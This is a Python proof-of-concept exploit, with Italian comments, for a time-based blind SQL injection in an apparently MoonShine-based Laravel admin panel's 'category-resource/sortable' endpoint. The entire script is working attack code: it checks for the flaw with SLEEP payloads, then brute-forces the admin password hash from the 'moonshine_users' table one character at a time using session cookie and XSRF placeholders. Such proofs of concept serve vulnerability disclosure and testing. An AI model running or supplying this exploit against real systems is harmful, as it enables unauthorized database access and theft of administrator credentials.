import requests
import time
import string
from urllib.parse import quote

# Configurazione
TARGET_URL = "http://localhost/admin/category-resource/sortable"
DELAY_THRESHOLD = 3
VERIFY_SSL = False

# Headers
HEADERS = {
    "Host": "localhost",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "multipart/form-data; boundary=------WebKitFormBoundaryPoC",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "XSRF-TOKEN=<XSRF-TOKEN>; laravel_session=<COOKIE>",
    "X-XSRF-TOKEN": "<XSRF-TOKEN>"
}

def build_payload(injection):
    """Costruisce il payload multipart/form-data"""
    boundary = "------WebKitFormBoundaryPoC"
    payload = f"""--{boundary}
Content-Disposition: form-data; name="id"

1
--{boundary}
Content-Disposition: form-data; name="parent"

1
--{boundary}
Content-Disposition: form-data; name="index"

1
--{boundary}
Content-Disposition: form-data; name="data"

{injection}
--{boundary}--"""
    return payload

def send_request(payload):
    try:
        response = requests.post(
            TARGET_URL,
            headers=HEADERS,
            data=payload,
            verify=VERIFY_SSL,
            timeout=50
        )
        return response
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None

def is_vulnerable():
    injection = f"(SELECT SLEEP({DELAY_THRESHOLD}))"
    payload = build_payload(injection)

    start = time.time()
    send_request(payload)
    elapsed = time.time() - start
    print(f"Elapsed time: {elapsed:.2f} seconds")

    return elapsed >= DELAY_THRESHOLD

def extract_admin_password(user_id=1):
    charset = string.ascii_letters + string.digits + "$."
    password = ""
    pos = 1
    while(True):
        char_found = False

        for char in charset:
            safe_char = quote(char) if char in {'"', "'", "\\"} else char
            injection = f"(SELECT password FROM moonshine_users WHERE id={user_id} AND BINARY SUBSTRING(password FROM {pos} FOR 1)='{safe_char}' AND SLEEP({DELAY_THRESHOLD}))"
            payload = build_payload(injection)
            start_time = time.time()
            response = send_request(payload)

            elapsed = time.time() - start_time

            if elapsed >= DELAY_THRESHOLD:
                password += char
                # print(f"[+] Character {pos}: '{char}' - Hash: '{password}'")
                char_found = True
                pos += 1
                break

        if not char_found:
            if len(password)==0:
                break  
            print(f"[*] Hash dumped correctly!")
            break

    return password if password else None

def main():
    print("[*] Verifing SQLi time-based...")
    if not is_vulnerable():
        print("[-] Target not vulnerable")
        return

    print("[+] Target vulnerable!")

    print("\n[*] Dumping admin password...")
    password = extract_admin_password(1)

    if password:
        print(f"\n[+] Admin password hash extracted: '{password}'")
    else:
        print("[-] Dump failed!")

if __name__ == "__main__":
    main()
